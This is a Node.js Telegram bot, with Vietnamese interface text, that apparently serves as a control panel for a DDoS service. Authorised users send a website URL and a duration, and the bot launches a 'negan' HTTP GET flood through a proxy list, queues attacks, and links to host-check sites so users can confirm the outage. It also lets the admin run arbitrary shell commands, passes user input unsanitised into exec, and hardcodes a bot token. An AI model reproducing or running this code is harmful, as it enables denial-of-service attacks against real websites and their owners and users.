const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const token = '7935173392:AAFYFVwBtjee7R33I64gcB3CE_-veYkU4lU';
const adminId = 1243471275;
const allowedGroupIds = new Set([-1002423723717, 987654321, 112233445, 556677889, 998877665]);
const maxTime = 120, maxConcurrent = 3, maxSlot = 1;

const bot = new TelegramBot(token, { polling: true });
const processes = { 
  users: new Map(), 
  attacks: new Map(), 
  queue: [],
  getUserCount: uid => [...processes.users.values()].filter(x => x.uid === uid).length
};

// ==================== CORE FUNCTIONS ====================
const sendMsg = (chatId, text, buttons) => bot.sendMessage(chatId, text, {
  parse_mode: 'Markdown',
  reply_markup: buttons ? { inline_keyboard: buttons } : undefined
});

const cleanup = (pid, uid) => {
  processes.attacks.delete(pid);
  processes.users.delete(uid);
  processQueue();
};

const processQueue = () => {
  while (processes.queue.length > 0 && processes.attacks.size < maxConcurrent) {
    const task = processes.queue.shift();
    execute(...Object.values(task));
  }
};

const execute = (chatId, host, time, user, uid) => {
  const pid = Date.now() % 1e6;
  const startTime = new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
  
  const attackData = {
    Status: "🚀 Successfully 🚀",
    Caller: user,
    "PID Attack": pid,
    Website: host,
    Time: `${time} Giây`,
    Maxslot: maxSlot,
    ConcurrentAttacks: processes.attacks.size + 1,
    StartTime: startTime,
    CheckHostURL: `https://check-host.net/check-http?host=${host}`,
    HostTracker: `https://www.host-tracker.com/en/ic/check-http?url=${host}`
  };

  const buttons = [
    [{ text: '🔍 Check Host', url: attackData.CheckHostURL }],
    [{ text: '📡 Host Tracker', url: attackData.HostTracker }]
  ];

  sendMsg(chatId, '```json\n' + JSON.stringify(attackData, null, 2) + '\n```', buttons);

  const child = exec(`node ./negan -m GET -u "${host}" -p live.txt --full true -s ${time}`);
  
  processes.attacks.set(pid, { uid, child, start: Date.now() });
  processes.users.set(uid, { pid, host, time, start: Date.now() });

  child
    .on('error', e => sendMsg(chatId, `❌ Lỗi hệ thống: \`${e.message}\``))
    .on('exit', () => {
      sendMsg(chatId, [
        `🛸 END ATTACK PID: ${pid}`,
        `WEBSITE: ${host}`,
        `Time: ${time}s`,
        `End: ${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}`
      ].join('\n'));
      cleanup(pid, uid);
    });
};

// ==================== BOT HANDLERS ====================
bot.on('message', msg => {
  const { chat: { id: cid }, text, from: { id: uid, username: user = 'Unknown' } = {} } = msg;
  
  // Kiểm tra quyền
  if (![adminId, ...allowedGroupIds].includes(cid)) return sendMsg(cid, '🚫 Bạn không có quyền!');
  
  if (!text) return;

  // Xử lý lệnh tấn công
  if (text.startsWith('http')) {
    const [host, time] = text.split(/\s+/);
    const attackTime = Math.min(parseInt(time) || 0, maxTime);
    
    if (!host || !attackTime) return sendMsg(cid, '⚠️ Sai cú pháp! Ví dụ: https://example.com 60');
    if (attackTime > maxTime) return sendMsg(cid, `⏳ Tối đa ${maxTime} giây!`);
    
    const userAttacks = processes.getUserCount(uid);
    if (userAttacks >= maxSlot) return sendMsg(cid, `⛔ Bạn đã dùng hết ${maxSlot} slot!`);

    const task = { chatId: cid, host, time: attackTime, user, uid };
    processes.attacks.size >= maxConcurrent 
      ? (processes.queue.push(task), sendMsg(cid, '📥 Lệnh đã vào hàng đợi!')) 
      : execute(...Object.values(task));
    return;
  }

  // Xử lý lệnh admin
  if (text.startsWith('exe ') && uid === adminId) {
    const cmd = text.slice(4).trim();
    if (!cmd) return sendMsg(cid, '⚠️ Vui lòng nhập lệnh!');
    
    exec(cmd, (err, stdout, stderr) => {
      const output = stdout || stderr || 'No output';
      sendMsg(cid, '```\n' + (err ? `❌ Lỗi: ${err.message}` : output) + '\n```');
    });
    return;
  }

  sendMsg(cid, '❌ Lệnh không hợp lệ! Gửi URL + thời gian hoặc dùng lệnh exe (admin)');
});

bot.sendMessage(adminId, '[NEGAN PRO] Bot đã sẵn sàng 🚀');
